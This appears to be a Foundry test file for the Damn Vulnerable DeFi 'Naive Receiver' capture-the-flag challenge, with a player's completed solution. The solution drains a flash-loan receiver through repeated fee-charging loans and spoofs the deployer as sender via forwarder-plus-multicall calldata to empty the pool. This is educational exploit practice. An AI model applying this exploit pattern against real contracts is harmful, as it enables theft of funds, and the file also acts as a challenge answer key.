// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        _debugBalances("Initial state");
        // 显示各个账户的地址
        console.log("Player address:", player);
        console.log("Deployer address:", deployer);
        console.log("Pool address:", address(pool));
        console.log("Receiver address:", address(receiver));
        console.log("Recovery address:", address(recovery));
        console.log("Forwarder address:", address(forwarder));
        console.log("WETH address:", address(weth));

        // 重复十次闪电贷来耗尽receiver的资金
        for (uint256 i = 0; i < 10; i++) {
            // 构造一个正常的Request结构体来向pool借闪电贷
            BasicForwarder.Request memory request = BasicForwarder.Request({
                from: player,
                target: address(pool),
                value: 0,
                gas: 1000000,
                nonce: forwarder.nonces(player),
                data: abi.encodeWithSignature(
                    "flashLoan(address,address,uint256,bytes)",
                    address(receiver),
                    address(weth),
                    1, // 借最小金额即可，主要是为了收取手续费
                    ""
                ),
                deadline: block.timestamp + 1 hours
            });
            
            // 对请求进行签名
            bytes32 requestHash = forwarder.getDataHash(request);
            bytes32 digest = keccak256(abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                requestHash
            ));
            
            (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(playerPk, digest);
            bytes memory signature = abi.encodePacked(r1, s1, v1);
            
            // 执行闪电贷请求
            forwarder.execute(request, signature);
        }

        // 使用Multicall执行withdraw操作
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSignature(
            "withdraw(uint256,address)",
            WETH_IN_POOL + WETH_IN_RECEIVER,
            address(recovery),
            address(deployer)
        );
        
        // 使用BasicForwarder请求来执行multicall
        BasicForwarder.Request memory request2 = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 1000000,
            nonce: forwarder.nonces(player),
            data: abi.encodeWithSignature("multicall(bytes[])", calls),
            deadline: block.timestamp + 1 hours
        });
        
        // 对请求进行签名
        bytes32 requestHash2 = forwarder.getDataHash(request2);
        bytes32 digest2 = keccak256(abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            requestHash2
        ));
        
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(playerPk, digest2);
        bytes memory signature2 = abi.encodePacked(r2, s2, v2);
        
        // 执行包含withdraw的multicall请求
        forwarder.execute(request2, signature2);

        _debugBalances("After flash loan");
    }

    function _debugBalances(string memory label) private view {
        console.log("\n=== %s ===", label);
        
        console.log("\n Pool Deposits:");
        console.log("  Deployer:  %s WETH", pool.deposits(deployer) / 1e18);
        console.log("  Receiver:  %s WETH", pool.deposits(address(receiver)) / 1e18);
        console.log("  Player:    %s WETH", pool.deposits(player) / 1e18);
        
        console.log("\n WETH Balances:");
        console.log("  Pool:      %s WETH", weth.balanceOf(address(pool)) / 1e18);
        console.log("  Receiver:  %s WETH", weth.balanceOf(address(receiver)) / 1e18);
        console.log("  Player:    %s WETH", weth.balanceOf(player) / 1e18);
        console.log("  Deployer:  %s WETH", weth.balanceOf(deployer) / 1e18);
        
        console.log("\n Total WETH Supply: %s WETH", weth.totalSupply() / 1e18);
        console.log("=====================================\n");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
